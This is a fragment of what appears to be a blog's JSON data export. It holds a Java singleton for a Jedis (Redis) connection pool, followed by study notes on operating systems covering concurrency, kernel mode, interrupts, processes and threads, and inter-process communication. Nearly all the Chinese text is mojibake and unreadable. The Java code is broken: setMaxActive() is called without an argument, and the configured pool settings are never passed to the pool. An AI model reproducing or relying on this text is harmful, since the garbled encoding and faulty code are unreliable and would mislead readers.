JedisPoolUtils { private static volatile JedisPool jedisPool = null; private JedisPoolUtils() { } public static JedisPool getJedisPoolInstance() { if (null == jedisPool) { synchronized (JedisPoolUtils.class) { if (null == jedisPool) { JedisPoolConfig jedisPoolConfig = new JedisPoolConfig(); jedisPoolConfig.setMaxActive(); jedisPoolConfig.setMaxIdle(32); jedisPoolConfig.setMaxWaitMillis(100*1000); jedisPoolConfig.setTestOnBorrow(true); jedisPool = new JedisPool(&quot;127.0.0.1&quot;, 6379); } } } return jedisPool; } } JedisPoolConfig: 1593434346091 ç¼“å­˜é›ªå´©","categories":[],"tags":[{"name":"middleware","slug":"middleware","permalink":"https://blog.kayleh.top/tags/middleware/"}]},{"title":"Operating Systems","slug":"æ“ä½œç³»ç»Ÿ","date":"2020-06-20T05:14:21.000Z","updated":"2021-04-11T17:11:28.898Z","comments":true,"path":"æ“ä½œç³»ç»Ÿ/","link":"","permalink":"https://blog.kayleh.top/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/","excerpt":"æ“ä½œç³»ç»ŸOS Kernelçš„ç‰¹å¾","text":"æ“ä½œç³»ç»ŸOS Kernelçš„ç‰¹å¾ å¹¶å‘å¹¶å‘ï¼šæŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶é—´é—´éš”å†…å‘ç”Ÿã€‚è¿™äº›äº‹ä»¶å®è§‚ä¸Šæ˜¯åŒæ—¶å‘ç”Ÿçš„ï¼Œä½†å¾®è§‚ä¸Šæ˜¯äº¤æ›¿å‘ç”Ÿçš„ã€‚ å¸¸è€ƒæ˜“æ··æ¦‚å¿µâ€”â€”å¹¶è¡Œï¼šæŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªäº‹ä»¶åœ¨åŒä¸€æ—¶åˆ»åŒæ—¶å‘ç”Ÿã€‚ æ“ä½œç³»ç»Ÿçš„å¹¶å‘æ€§æŒ‡è®¡ç®—æœºç³»ç»Ÿä¸­â€œåŒæ—¶â€è¿è¡Œç€å¤šä¸ªç¨‹åºï¼Œè¿™äº›ç¨‹åºå®è§‚ä¸Šçœ‹æ˜¯åŒæ—¶è¿è¡Œç€çš„ï¼Œè€Œå¾®è§‚ ä¸Šçœ‹æ˜¯äº¤æ›¿è¿è¡Œçš„ã€‚ æ“ä½œç³»ç»Ÿå°±æ˜¯ä¼´éšç€â€œå¤šé“ç¨‹åºæŠ€æœ¯â€è€Œå‡ºç°çš„ã€‚å› æ­¤ï¼Œæ“ä½œç³»ç»Ÿå’Œç¨‹åºå¹¶å‘æ˜¯ä¸€èµ·è¯ç”Ÿçš„ã€‚ æ³¨æ„ï¼š å•æ ¸CPUåŒä¸€æ—¶åˆ»åªèƒ½æ‰§è¡Œä¸€ä¸ªç¨‹åºï¼Œå„ä¸ªç¨‹åºåªèƒ½å¹¶å‘åœ°æ‰§è¡Œ å¤šæ ¸CPUåŒä¸€æ—¶åˆ»å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šä¸ªç¨‹åºï¼Œå¤šä¸ªç¨‹åºå¯ä»¥å¹¶è¡Œåœ°æ‰§è¡Œã€‚ è®¡ç®—æœºç³»ç»Ÿä¸­å­˜åœ¨å¤šä¸ªè¿è¡Œçš„ç¨‹åºï¼Œéœ€è¦OSç®¡ç†å’Œè°ƒåº¦ å…±äº«å…±äº«å³èµ„æºå…±äº«ï¼Œæ˜¯æŒ‡ç³»ç»Ÿä¸­çš„èµ„æºå¯ä¾›å†…å­˜ä¸­å¤šä¸ªå¹¶å‘æ‰§è¡Œçš„è¿›ç¨‹å…±åŒä½¿ç”¨ã€‚ åŒæ—¶å…±äº« ç³»ç»Ÿä¸­çš„æŸäº›èµ„æºï¼Œè™½ç„¶å¯ä»¥æä¾›ç»™ å¤šä¸ªè¿›ç¨‹ä½¿ç”¨ï¼Œä½†ä¸€ä¸ªæ—¶é—´æ®µå†…åªå… è®¸ä¸€ä¸ªè¿›ç¨‹è®¿é—®è¯¥èµ„æº äº’æ–¥å…±äº« ç³»ç»Ÿä¸­çš„æŸäº›èµ„æºï¼Œå…è®¸ä¸€ä¸ªæ—¶é—´æ®µ å†…ç”±å¤šä¸ªè¿›ç¨‹â€œåŒæ—¶â€å¯¹å®ƒä»¬è¿›è¡Œè®¿ é—® æ‰€è°“çš„â€œåŒæ—¶â€å¾€å¾€æ˜¯å®è§‚ä¸Šçš„ï¼Œè€Œåœ¨å¾®è§‚ä¸Šï¼Œè¿™äº›è¿›ç¨‹å¯èƒ½æ˜¯äº¤æ›¿åœ°å¯¹è¯¥èµ„æºè¿›è¡Œè®¿é—®çš„ï¼ˆå³åˆ†æ—¶å…±äº«ï¼‰ç”Ÿæ´»å®ä¾‹ï¼š äº’æ–¥å…±äº«æ–¹å¼ï¼šä½¿ç”¨QQå’Œå¾®ä¿¡è§†é¢‘ã€‚åŒä¸€æ—¶é—´æ®µå†…æ‘„åƒå¤´åªèƒ½åˆ†é…ç»™å…¶ä¸­ä¸€ä¸ªè¿›ç¨‹ã€‚ åŒæ—¶å…±äº«æ–¹å¼ï¼šä½¿ç”¨QQå‘é€æ–‡ä»¶Aï¼ŒåŒæ—¶ä½¿ç”¨å¾®ä¿¡å‘é€æ–‡ä»¶Bã€‚å®è§‚ä¸Šçœ‹ï¼Œä¸¤è¾¹éƒ½åœ¨åŒæ—¶è¯»å–å¹¶å‘é€æ–‡ä»¶ï¼Œ è¯´æ˜ä¸¤ä¸ªè¿›ç¨‹éƒ½åœ¨è®¿é—®ç¡¬ç›˜èµ„æºï¼Œä»ä¸­è¯»å–æ•°æ®ã€‚å¾®è§‚ä¸Šçœ‹ï¼Œä¸¤ä¸ªè¿›ç¨‹æ˜¯äº¤æ›¿ç€è®¿é—®ç¡¬ç›˜çš„ã€‚ å…±äº«å’Œå¹¶å‘çš„å…³ç³»ï¼šå¹¶å‘æ€§æŒ‡è®¡ç®—æœºç³»ç»Ÿä¸­åŒæ—¶å­˜åœ¨ç€å¤šä¸ªè¿è¡Œç€çš„ç¨‹åºã€‚ å…±äº«æ€§æ˜¯æŒ‡ç³»ç»Ÿä¸­çš„èµ„æºå¯ä¾›å†…å­˜ä¸­å¤šä¸ªå¹¶å‘æ‰§è¡Œçš„è¿›ç¨‹å…±åŒä½¿ç”¨ã€‚ é€šè¿‡ä¸Šè¿°ä¾‹å­æ¥çœ‹å¹¶å‘ä¸å…±äº«çš„å…³ç³»ï¼š å¹¶å‘æ€§ä¸å…±äº«æ€§æ˜¯äº’ä¸ºå­˜åœ¨æ¡ä»¶ã€‚ è™šæ‹Ÿåˆ©ç”¨å¤šé“ç¨‹åºè®¾è®¡æŠ€æœ¯ï¼Œè®©æ¯ä¸ªç”¨æˆ·éƒ½è§‰å¾—æœ‰ä¸€ä¸ªè®¡ç®—æœºä¸“é—¨ä¸ºä»–æœåŠ¡ã€‚è™šæ‹Ÿæ˜¯æŒ‡æŠŠä¸€ä¸ªç‰©ç†ä¸Šçš„å®ä½“å˜ä¸ºè‹¥å¹²ä¸ªé€»è¾‘ä¸Šçš„å¯¹åº”ç‰©ã€‚ç‰©ç†å®ä½“æ˜¯å®é™…å­˜åœ¨çš„ï¼Œè€Œé€»è¾‘ä¸Š å¯¹åº”ç‰©æ˜¯ç”¨æˆ·æ„Ÿå—åˆ°çš„ã€‚è™šæ‹ŸæŠ€æœ¯ä¸­çš„â€œæ—¶åˆ†å¤ç”¨ æŠ€æœ¯â€ã€‚å¾®è§‚ä¸Šå¤„ç†æœºåœ¨ å„ä¸ªå¾®å°çš„æ—¶é—´æ®µå†…äº¤æ›¿ ç€ä¸ºå„ä¸ªè¿›ç¨‹æœåŠ¡ è™šæ‹ŸæŠ€æœ¯åˆ†ä¸ºç©ºåˆ†å¤ç”¨æŠ€æœ¯ï¼ˆå¦‚è™šæ‹Ÿå­˜å‚¨å™¨æŠ€æœ¯ï¼‰å’Œæ—¶åˆ†å¤ç”¨æŠ€æœ¯ï¼ˆå¦‚è™šæ‹Ÿå¤„ç†å™¨ï¼‰ã€‚ æ²¡æœ‰å¹¶å‘æ€§ï¼Œå°±æ²¡æœ‰è™šæ‹Ÿæ€§ å¼‚æ­¥ç¨‹åºçš„æ‰§è¡Œä¸æ˜¯ä¸€è´¯åˆ°åº•ï¼Œè€Œæ˜¯èµ°èµ°åœåœï¼Œå‘å‰æ¨è¿›çš„é€Ÿåº¦ä¸å¯é¢„çŸ¥ã€‚ ä½†åªè¦è¿è¡Œç¯å¢ƒç›¸åŒï¼ŒOSéœ€è¦ä¿è¯ç¨‹åºè¿è¡Œçš„ç»“æœä¹Ÿè¦ç›¸åŒã€‚ åªæœ‰æ‹¥æœ‰å¹¶å‘æ€§æ‰æœ‰å¼‚æ­¥æ€§ã€‚ æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½èµ„æºçš„ç®¡ç†è€… å¤„ç†æœºç®¡ç† å¤„ç†æœºåˆ†é…éƒ½æ˜¯ä»¥è¿›ç¨‹ä¸ºå•ä½ï¼Œæ‰€ä»¥å¤„ç†æœºç®¡ç†ä¹Ÿè¢«çœ‹åšæ˜¯è¿›ç¨‹ç®¡ç†ã€‚åŒ…æ‹¬è¿›ç¨‹æ§åˆ¶ï¼Œè¿›ç¨‹åŒæ­¥ï¼Œè¿›ç¨‹é€šä¿¡å’Œè¿›ç¨‹è°ƒåº¦ å­˜å‚¨å™¨ç®¡ç† å†…å­˜åˆ†é…ï¼Œå†…å­˜ä¿æŠ¤ï¼Œåœ°å€æ˜ å°„ï¼Œå†…å­˜æ‰©å…… æ–‡ä»¶ç®¡ç† ç®¡ç†ç”¨æˆ·æ–‡ä»¶å’Œç³»ç»Ÿæ–‡ä»¶ï¼Œæ–¹ä¾¿ä½¿ç”¨åŒæ—¶ä¿è¯å®‰å…¨æ€§ã€‚åŒ…æ‹¬ï¼šç£ç›˜å­˜å‚¨ç©ºé—´ç®¡ç†ï¼Œç›®å½•ç®¡ç†ï¼Œæ–‡ä»¶è¯»å†™ç®¡ç†ä»¥åŠæ–‡ä»¶å…±äº«å’Œä¿æŠ¤ è®¾å¤‡ç®¡ç† ç®¡ç†æ‰€æœ‰å¤–å›´è®¾å¤‡ï¼ŒåŒ…æ‹¬å®Œæˆç”¨æˆ·çš„IOè¯·æ±‚ï¼›ä¸ºç”¨æˆ·è¿›ç¨‹åˆ†é…IOè®¾å¤‡ï¼›æé«˜IOè®¾å¤‡åˆ©ç”¨ç‡ï¼›æé«˜IOé€Ÿåº¦ï¼›æ–¹ä¾¿IOçš„ä½¿ç”¨ æä¾›æ¥å£ï¼šç¨‹åºæ¥å£ï¼ˆAPIï¼‰å’Œç”¨æˆ·æ¥å£ï¼ˆGUIï¼‰ è”æœºå‘½ä»¤æ¥å£å®ä¾‹ è”æœºå‘½ä»¤æ¥å£å°±æ˜¯äº¤äº’å¼å‘½ä»¤æ¥å£(CMD) ç”¨æˆ·å‘½ä»¤ä¸€å¥ï¼Œç³»ç»Ÿæ‰§è¡Œä¸€å¥ã€‚ è„±æœºå‘½ä»¤æ¥å£å®ä¾‹ è„±æœºå‘½ä»¤æ¥å£å®ä¾‹ï¼Œè„±æœºå‘½ä»¤æ¥å£ä¹Ÿå°±æ˜¯æ‰¹å¤„ç†å‘½ä»¤æ¥å£ ç”¨æˆ·å‘½ä»¤ä¸€å †ï¼Œç³»ç»Ÿæ‰§è¡Œä¸€å †ã€‚ ç¨‹åºæ¥å£ï¼š å¯ä»¥åœ¨ç¨‹åºä¸­è¿›è¡Œç³»ç»Ÿè°ƒç”¨(å¹¿ä¹‰æŒ‡ä»¤)æ¥ä½¿ç”¨ç¨‹åºæ¥å£ã€‚æ™®é€šç”¨æˆ·ä¸èƒ½ç›´æ¥ä½¿ç”¨ç¨‹åºæ¥å£ï¼Œåªèƒ½é€šè¿‡ç¨‹ åºä»£ç é—´æ¥ä½¿ç”¨ã€‚ BIOSå…³ç³»ï¼šDISKï¼šå­˜æ”¾OS BIOSï¼šåŸºæœ¬I/Oå¤„ç†ç³»ç»Ÿï¼Œæœ€åŸºæœ¬çš„åŠŸèƒ½æ˜¯ç”µæºå¼€å¯åæ£€æµ‹å¤–è®¾ï¼Œä¹‹ååŠ è½½ç›¸åº”çš„è½¯ä»¶æ¥æ‰§è¡Œ Bootloaderï¼šåŠ è½½OSï¼ŒæŠŠOSä»ç¡¬ç›˜æ”¾åˆ°å†…å­˜é‡Œï¼Œè®©CPUå¯ä»¥æ“ä½œç³»ç»Ÿï¼Œ 1592878521236 ä»å›¾å¯ä»¥çœ‹å‡ºï¼Œè®¡ç®—æœºé‡Œé¢æœ‰ä¸€éƒ¨åˆ†ç©ºé—´ï¼ˆç¡¬ç›˜ï¼‰å·²ç»ç»™BIOSå ç”¨äº†ï¼Œä½†æ˜¯è¿˜æœ‰å¾ˆå¤šåœ°æ–¹æ˜¯ç©ºçš„ï¼ŒBIOSéœ€è¦ä»ä¸€ä¸ªç‰¹å®šçš„åœ°å€å¼€å§‹æ‰§è¡Œï¼Œä»¥X86ä¸ºä¾‹ï¼Œå›ºå®šçš„åœ°å€ä¸º0xf000:fff0. CSå¯„å­˜å™¨å’ŒIPå¯„å­˜å™¨ä¸€èµ·å¯ä»¥å½¢æˆä¸€ä¸ªå†…å­˜åœ°å€ï¼Œä¸€å¼€å§‹åŠ ç”µï¼ŒBIOSå°±ä»è¿™ä¸ªåœ°å€å¼€å§‹æ‰§è¡Œã€‚æ‰§è¡Œä¸€ç³»åˆ—çš„å·¥ä½œï¼š POSTï¼ˆåŠ ç”µè‡ªæ£€ï¼‰ å¯»æ‰¾æ˜¾å¡å’Œæ‰§è¡ŒBIOSï¼Œæ£€æŸ¥è®¾å¤‡æ˜¯å¦å¯ä»¥æ­£å¸¸å·¥ä½œã€‚åˆå§‹åŒ–çš„æ£€æ“¦ã€‚ BIOSæ˜¯å¦‚ä½•æŠŠbootloaderæ”¾è¿›å»çš„ï¼š Bootloaderä¸€èˆ¬æ˜¯æ”¾åœ¨ç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªä¸»å¼•å¯¼æ‰‡åŒºã€‚ç¬¬ä¸€ä¸ªæ‰‡åŒºæ˜¯512ä¸ªå­—èŠ‚ã€‚æŠŠbootloaderæ”¾åˆ°å†…å­˜é‡Œï¼ŒCPUçš„æŒæ§æƒå°±åœ¨bootloaderï¼› è¿è¡Œæœºåˆ¶ä¸¤ç§æŒ‡ä»¤ ç‰¹æƒæŒ‡ä»¤ï¼Œå¦‚å†…å­˜æ¸…é›¶æŒ‡ä»¤â€”â€”ä¸å…è®¸ç”¨æˆ·ç¨‹åºä½¿ç”¨ éç‰¹æƒæŒ‡ä»¤ï¼Œå¦‚æ™®é€šçš„è¿ç®—æŒ‡ä»¤ã€‚ ä¸¤ç§å¤„ç†å™¨çŠ¶æ€ ç”¨æˆ·æ€ï¼ˆç›®æ€ï¼‰ æ ¸å¿ƒæ€ï¼ˆç®¡æ€ï¼‰ ä¸¤ç§ç¨‹åº å†…æ ¸ç¨‹åº åº”ç”¨ç¨‹åº æ“ä½œç³»ç»Ÿå†…æ ¸ä¸ç¡¬ä»¶å…³è”ç´§å¯†çš„æ¨¡å— æ—¶é’Ÿç®¡ç† ä¸­æ–­å¤„ç† åŸè¯­ å…¶ä»–ï¼š å¯¹ç³»ç»Ÿèµ„æºè¿›è¡Œç®¡ç†çš„åŠŸèƒ½ æ“ä½œç³»ç»Ÿçš„ä½“ç³»ç»“æ„ å¤§å†…æ ¸ï¼šå°†æ“ä½œç³»ç»Ÿçš„ä¸»è¦åŠŸèƒ½æ¨¡å—éƒ½ä½œä¸ºç³»ç»Ÿå†…æ ¸ï¼Œè¿è¡Œåœ¨æ ¸å¿ƒæ€ ä¼˜ç‚¹ï¼šé«˜æ€§èƒ½ ç¼ºç‚¹ï¼šå†…æ ¸ä»£ç åºå¤§ã€‚ç»“æ„æ··ä¹±ï¼Œéš¾ä»¥ç»´æŠ¤ã€‚ å¾®å†…æ ¸ï¼šåªæŠŠæœ€åŸºæœ¬çš„åŠŸèƒ½ä¿ç•™åœ¨å†…æ ¸ã€ ä¼˜ç‚¹ï¼šå†…æ ¸åŠŸèƒ½å°‘ï¼Œç»“æ„æ¸…æ™°ï¼Œæ–¹ä¾¿ç»´æŠ¤ ç¼ºç‚¹ï¼šéœ€è¦é¢‘ç¹çš„åœ¨æ ¸å¿ƒæ€å’Œç”¨æˆ·æ€ä¹‹é—´åˆ‡æ¢ï¼Œæ€§èƒ½ä½ 1.ç‰¹æƒæŒ‡ä»¤åªèƒ½åœ¨æ ¸å¿ƒæ€ä¸‹æ‰§è¡Œ 2.å†…æ ¸ç¨‹åºåªèƒ½åœ¨æ ¸å¿ƒæ€ä¸‹æ‰§è¡Œ 3.æ ¸å¿ƒæ€å’Œç”¨æˆ·æ€çš„åˆ‡æ¢ æ“ä½œç³»ç»Ÿä¸è®¾å¤‡å’Œç¨‹åºäº¤äº’ã€‚ç³»ç»Ÿè°ƒç”¨ã€å¼‚å¸¸ã€ä¸­æ–­ ç³»ç»Ÿè°ƒç”¨ï¼ˆæ¥æºäºåº”ç”¨ç¨‹åºï¼‰sys call åº”ç”¨ç¨‹åºä¸»åŠ¨å‘æ“ä½œç³»ç»Ÿå‘å‡ºæœåŠ¡è¯·æ±‚ã€‚ å¼‚å¸¸ï¼ˆæ¥æºäºä¸è‰¯çš„åº”ç”¨ç¨‹åºï¼‰ exception éæ³•æŒ‡ä»¤æˆ–è€…å…¶ä»–åçš„å¤„ç†çŠ¶æ€ï¼ˆå¦‚ï¼šå†…å­˜å‡ºé”™ï¼‰ ä¸­æ–­ï¼ˆæ¥æºä¸å¤–è®¾ï¼‰interrupt æ¥è‡ªä¸åŒç¡¬ä»¶è®¾å¤‡çš„è®¡æ—¶å™¨å’Œç½‘ç»œä¸­æ–­ã€‚ ä¸ºä»€ä¹ˆåº”ç”¨ç¨‹åºä¸ç›´æ¥ä½¿ç”¨å¤–è®¾è€Œè¦ç»è¿‡æ“ä½œç³»ç»Ÿï¼Ÿ åœ¨è®¡ç®—æœºè¿è¡Œä¸­ï¼Œå†…æ ¸æ˜¯è¢«ä¿¡ä»»çš„ç¬¬ä¸‰æ–¹ åªæœ‰å†…æ ¸å¯ä»¥æ‰§è¡Œç‰¹æƒæŒ‡ä»¤ ä¸ºäº†æ–¹ä¾¿åº”ç”¨ç¨‹åº äº§ç”Ÿçš„æºå¤´ï¼š ä¸­æ–­ï¼šå¤–è®¾ å¼‚å¸¸ï¼šåº”ç”¨ç¨‹åºæ„æƒ³ä¸åˆ°çš„è¡Œä¸º ç³»ç»Ÿè°ƒç”¨ï¼šåº”ç”¨ç¨‹åºè¯·æ±‚æ“ä½œæä¾›æœåŠ¡ã€‚ å¤„ç†æ—¶é—´ï¼š ä¸­æ–­ï¼šå¼‚æ­¥ï¼Œå¼‚æ­¥ï¼šå½“è¿™ä¸ªäº‹ä»¶äº§ç”Ÿçš„æ—¶å€™ï¼Œæˆ‘ä»¬åº”ç”¨ç¨‹åºå¹¶ä¸çŸ¥é“ä»€ä¹ˆæ—¶å€™äº§ç”Ÿã€‚ å¼‚å¸¸ï¼šåŒæ­¥ï¼Œå¼‚å¸¸æ‰§è¡Œåˆ°æŸæ¡ç‰¹å®šçš„æŒ‡ä»¤åä¸€å®šä¼šäº§ç”Ÿ ç³»ç»Ÿè°ƒç”¨ï¼šå¼‚æ­¥æˆ–åŒæ­¥ï¼Œå½“ç³»ç»Ÿè°ƒç”¨å‘å‡ºè¯·æ±‚çš„æ—¶å€™ï¼Œè¿”å›çš„æ—¶é—´æ˜¯å¼‚æ­¥çš„ å“åº”ï¼š ä¸­æ–­ï¼šæŒç»­ï¼Œå¯¹ç”¨æˆ·åº”ç”¨ç¨‹åºæ˜¯é€æ˜çš„ã€ å¼‚å¸¸: æ€æ­»æˆ–è€…é‡æ–°æ‰§è¡Œæ„æƒ³ä¸åˆ°çš„åº”ç”¨ç¨‹åºæŒ‡ä»¤ ç³»ç»Ÿè°ƒç”¨ï¼šç­‰å¾…å’ŒæŒç»­ è¿›ç¨‹å’Œçº¿ç¨‹ä»¥åŠå®ƒä»¬çš„åŒºåˆ«è¿›ç¨‹æ˜¯å¯¹è¿è¡Œæ—¶ç¨‹åºçš„å°è£…ï¼Œæ˜¯ç³»ç»Ÿè¿›è¡Œèµ„æºè°ƒåº¦å’Œåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œå®ç°äº†æ“ä½œç³»ç»Ÿçš„å¹¶å‘ï¼ˆå¦‚ï¼šç”¨æˆ·è¿è¡Œè‡ªå·±çš„ç¨‹åºï¼Œç³»ç»Ÿå°±åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œå¹¶ä¸ºå®ƒåˆ†é…èµ„æºï¼ŒåŒ…æ‹¬å„ç§è¡¨æ ¼ã€å†…å­˜ç©ºé—´ã€ç£ç›˜ç©ºé—´ã€I/Oè®¾å¤‡ç­‰ï¼Œç„¶åè¯¥è¿›ç¨‹è¢«æ”¾å…¥åˆ°è¿›ç¨‹çš„å°±ç»ªé˜Ÿåˆ—ï¼Œè¿›ç¨‹è°ƒåº¦ç¨‹åºé€‰ä¸­å®ƒï¼Œä¸ºå®ƒåˆ†é…CPUåŠå…¶ä»–ç›¸å…³èµ„æºï¼Œè¯¥è¿›ç¨‹å°±è¢«è¿è¡Œèµ·æ¥ï¼‰ï¼› çº¿ç¨‹æ˜¯è¿›ç¨‹çš„å­ä»»åŠ¡ï¼Œæ˜¯CPUè°ƒåº¦å’Œåˆ†æ´¾çš„åŸºæœ¬å•ä½ï¼Œç”¨äºä¿è¯ç¨‹åºçš„å®æ—¶æ€§ï¼Œå®ç°è¿›ç¨‹å†…éƒ¨çš„å¹¶å‘ï¼› åœ¨æ²¡æœ‰å®ç°çº¿ç¨‹çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹æ—¢æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œåˆæ˜¯è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œå®ƒæ˜¯ç³»ç»Ÿä¸­å¹¶å‘æ‰§è¡Œçš„å•å…ƒã€‚è€Œåœ¨å®ç°äº†çº¿ç¨‹çš„æ“ä½œç³»ç»Ÿä¸­ï¼Œè¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œä½†æ˜¯çº¿ç¨‹æ˜¯è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œæ˜¯ç³»ç»Ÿä¸­å¹¶å‘æ‰§è¡Œçš„å•å…ƒã€‚ å¼•å…¥çº¿ç¨‹ä¸»è¦æœ‰ä»¥ä¸‹4ä¸ªæ–¹é¢çš„ä¼˜ç‚¹ï¼š 1ï¼‰æ˜“äºè°ƒåº¦ã€‚ 2ï¼‰æé«˜å¹¶å‘æ€§ã€‚é€šè¿‡çº¿ç¨‹å¯ä»¥æ–¹ä¾¿æœ‰æ•ˆåœ°å®ç°å¹¶å‘ã€‚ 3ï¼‰å¼€é”€å°ã€‚åˆ›å»ºçº¿ç¨‹æ¯”åˆ›å»ºè¿›ç¨‹è¦å¿«ï¼Œæ‰€éœ€è¦çš„å¼€é”€ä¹Ÿæ›´å°ã€‚ 4ï¼‰æœ‰åˆ©äºå‘æŒ¥å¤šå¤„ç†å™¨çš„åŠŸèƒ½ã€‚é€šè¿‡åˆ›å»ºå¤šçº¿ç¨‹ï¼Œæ¯ä¸ªçº¿ç¨‹éƒ½åœ¨ä¸€ä¸ªå¤„ç†å™¨ä¸Šè¿è¡Œï¼Œä»è€Œå®ç°åº”ç”¨ç¨‹åºçš„å¹¶è¡Œï¼Œä½¿æ¯ä¸ªå¤„ç†å™¨éƒ½å¾—åˆ°å……åˆ†çš„è¿è¡Œã€‚ å°½ç®¡çº¿ç¨‹å’Œè¿›ç¨‹å¾ˆç›¸ä¼¼ï¼Œä½†ä¸¤è€…ä¹Ÿå­˜åœ¨ç€å¾ˆå¤§çš„ä¸åŒï¼ŒåŒºåˆ«å¦‚ä¸‹ï¼š ä¸€ä¸ªç¨‹åºè‡³å°‘æœ‰ä¸€ä¸ªè¿›ç¨‹ï¼Œä¸€ä¸ªè¿›ç¨‹è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹ï¼Œçº¿ç¨‹ä¾èµ–äºè¿›ç¨‹è€Œå­˜åœ¨ï¼› è¿›ç¨‹åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ‹¥æœ‰ç‹¬ç«‹çš„å†…å­˜å•å…ƒï¼Œè€Œå¤šä¸ªçº¿ç¨‹å…±äº«è¿›ç¨‹çš„å†…å­˜ç©ºé—´ã€‚ å±äºä¸€ä¸ªè¿›ç¨‹çš„æ‰€æœ‰çº¿ç¨‹å…±äº«è¯¥è¿›ç¨‹çš„æ‰€æœ‰èµ„æºï¼ŒåŒ…æ‹¬æ‰“å¼€çš„æ–‡ä»¶ï¼Œåˆ›å»ºçš„Socketç­‰ã€‚ä¸åŒçš„è¿›ç¨‹äº’ç›¸ç‹¬ç«‹ã€‚ çº¿ç¨‹åˆè¢«ç§°ä¸ºè½»é‡çº§è¿›ç¨‹ã€‚è¿›ç¨‹æœ‰è¿›ç¨‹æ§åˆ¶å—ï¼Œçº¿ç¨‹æœ‰çº¿ç¨‹æ§åˆ¶å—ã€‚ä½†çº¿ç¨‹æ§åˆ¶å—æ¯”è¿›ç¨‹æ§åˆ¶å—å°å¾—å¤šã€‚çº¿ç¨‹é—´åˆ‡æ¢ä»£ä»·å°ï¼Œè¿›ç¨‹é—´åˆ‡æ¢ä»£ä»·å¤§ã€‚ è¿›ç¨‹æ˜¯ç¨‹åºçš„ä¸€æ¬¡æ‰§è¡Œï¼Œçº¿ç¨‹å¯ä»¥ç†è§£ä¸ºç¨‹åºä¸­ä¸€æ®µç¨‹åºç‰‡æ®µçš„æ‰§è¡Œã€‚ è¿›ç¨‹é—´çš„é€šä¿¡çš„å‡ ç§æ–¹å¼ç®¡é“ï¼ˆpipeï¼‰åŠå‘½åç®¡é“ï¼ˆnamed pipeï¼‰ï¼šç®¡é“å¯ç”¨äºå…·æœ‰äº²ç¼˜å…³ç³»çš„çˆ¶å­è¿›ç¨‹é—´çš„é€šä¿¡ï¼Œæœ‰åç®¡é“é™¤äº†å…·æœ‰ç®¡é“æ‰€å…·æœ‰çš„åŠŸèƒ½å¤–ï¼Œå®ƒè¿˜å…è®¸æ— äº²ç¼˜å…³ç³»è¿›ç¨‹é—´çš„é€šä¿¡ï¼› ä¿¡å·ï¼ˆsignalï¼‰ï¼šä¿¡å·æ˜¯ä¸€ç§æ¯”è¾ƒå¤æ‚çš„é€šä¿¡æ–¹å¼ï¼Œç”¨äºé€šçŸ¥æ¥æ”¶è¿›ç¨‹æŸä¸ªäº‹ä»¶å·²ç»å‘ç”Ÿï¼› æ¶ˆæ¯é˜Ÿåˆ—ï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯æ¶ˆæ¯çš„é“¾æ¥è¡¨ï¼Œå®ƒå…‹æœäº†ä¸Šä¸¤ç§é€šä¿¡æ–¹å¼ä¸­ä¿¡å·é‡æœ‰é™çš„ç¼ºç‚¹ï¼Œå…·æœ‰å†™æƒé™å¾—è¿›ç¨‹å¯ä»¥æŒ‰ç…§ä¸€å®šå¾—è§„åˆ™å‘æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ·»åŠ æ–°ä¿¡æ¯ï¼›å¯¹æ¶ˆæ¯é˜Ÿåˆ—æœ‰è¯»æƒé™å¾—è¿›ç¨‹åˆ™å¯ä»¥ä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­è¯»å–ä¿¡æ¯ï¼› å…±äº«å†…å­˜ï¼šå¯ä»¥è¯´è¿™æ˜¯æœ€æœ‰ç”¨çš„è¿›ç¨‹é—´é€šä¿¡æ–¹å¼ã€‚å®ƒä½¿å¾—å¤šä¸ªè¿›ç¨‹å¯ä»¥è®¿é—®åŒä¸€å—å†…å­˜ç©ºé—´ï¼Œä¸åŒè¿›ç¨‹å¯ä»¥åŠæ—¶çœ‹åˆ°å¯¹æ–¹è¿›ç¨‹ä¸­å¯¹å…±äº«å†…å­˜ä¸­æ•°æ®å¾—æ›´æ–°ã€‚è¿™ç§æ–¹å¼éœ€è¦ä¾é æŸç§åŒæ­¥æ“ä½œï¼Œå¦‚äº’æ–¥é”å’Œä¿¡å·é‡ç­‰ï¼› ä¿¡å·é‡ï¼šä¸»è¦ä½œä¸ºè¿›ç¨‹ä¹‹é—´åŠåŒä¸€ç§è¿›ç¨‹çš„ä¸åŒçº¿ç¨‹ä¹‹é—´å¾—åŒæ­¥å’Œäº’æ–¥æ‰‹æ®µï¼› å¥—æ¥å­—ï¼šè¿™æ˜¯ä¸€ç§æ›´ä¸ºä¸€èˆ¬å¾—è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œå®ƒå¯ç”¨äºç½‘ç»œä¸­ä¸åŒæœºå™¨ä¹‹é—´çš„è¿›ç¨‹é—´é€šä¿¡ï¼Œåº”ç”¨éå¸¸å¹¿æ³›ã€‚ çº¿ç¨‹çš„å®ç°æ–¹å¼(ç”¨æˆ·çº¿ç¨‹ä¸å†…æ ¸çº¿ç¨‹çš„åŒºåˆ«)æ ¹æ®æ“ä½œç³»ç»Ÿå†…æ ¸æ˜¯å¦å¯¹çº¿ç¨‹å¯æ„ŸçŸ¥ï¼Œå¯ä»¥æŠŠçº¿ç¨‹åˆ†ä¸ºå†…æ ¸çº¿ç¨‹å’Œç”¨æˆ·çº¿ç¨‹ã€‚ å†…æ 